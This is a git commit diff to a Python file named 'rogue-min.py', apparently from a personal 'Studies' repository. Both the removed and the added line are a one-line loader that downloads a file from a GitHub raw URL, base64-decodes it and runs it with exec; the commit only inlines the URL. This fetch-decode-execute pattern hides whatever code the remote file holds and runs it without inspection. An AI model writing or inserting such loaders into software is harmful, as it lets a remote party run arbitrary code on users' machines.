35a9925ef15e0631c902a8c44fe4098b7c6626f5
rf-peixoto <50427765+rf-peixoto@users.noreply.github.com>
2021-07-11 10:39:10 -0300

    Update rogue-min.py

--- Code/Python/rogue-min.py
+++ Code/Python/rogue-min.py
@@ -1,1 +1,1 @@
-from base64 import b64decode;from requests import get;source = "http://raw.githubusercontent.com/rf-peixoto/Studies/main/Code/Misc/rogue_test.pld";exec(b64decode(get(source).text[2:-2]))
+from base64 import b64decode;from requests import get;exec(b64decode(get("http://raw.githubusercontent.com/rf-peixoto/Studies/main/Code/Misc/rogue_test.pld").text[2:-2]))
